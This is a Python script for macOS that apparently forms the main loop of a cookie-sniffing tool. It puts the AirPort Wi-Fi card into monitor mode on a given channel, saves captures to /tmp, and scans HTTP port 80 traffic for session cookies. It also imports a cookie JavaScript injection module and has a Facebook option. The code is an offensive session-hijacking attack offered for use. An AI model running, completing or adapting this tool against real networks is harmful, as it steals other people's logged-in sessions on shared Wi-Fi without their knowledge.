#! /usr/bin/env python
import os, time,sys
from subprocess import *
from cookieJsInjection import *
from scapy.all import *
import threading

SLEEP_TIME = 10 # Number of seconds to sniff (update frequency)

cookies_seen =()

class scanCookies ( threading.Thread ):				
	def run(self):
		path="/tmp/"
		dirList=os.listdir(path)
		for fileName in dirList:
			if "airportSniff" in fileName:
				sniff(offline=path+fileName,filter="tcp port 80",prn=sniffCookies)
				os.remove(path+fileName)
						
def isRoot():
	"""Verifies if the current user is root"""
	return os.getuid() & os.getgid() == 0
	
def printUsage():
	print "Usage: %s CHANNEL <-facebook>" % sys.argv[0]

if __name__ == "__main__":
	if len(sys.argv) < 2:
		printUsage()
		sys.exit(0)
	
	channel = sys.argv[1]
		
	if not isRoot():
		print "[-] Your have to be root to put airport into monitor mode"
		sys.exit(0)

	print "[*] Starting scan on channel %s" % channel	
	while(True):			
		p = Popen("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " +"sniff " + channel, shell=True)
		time.sleep(SLEEP_TIME)
		Popen("kill -HUP %s" % p.pid, shell=True)
		scanCookies().start()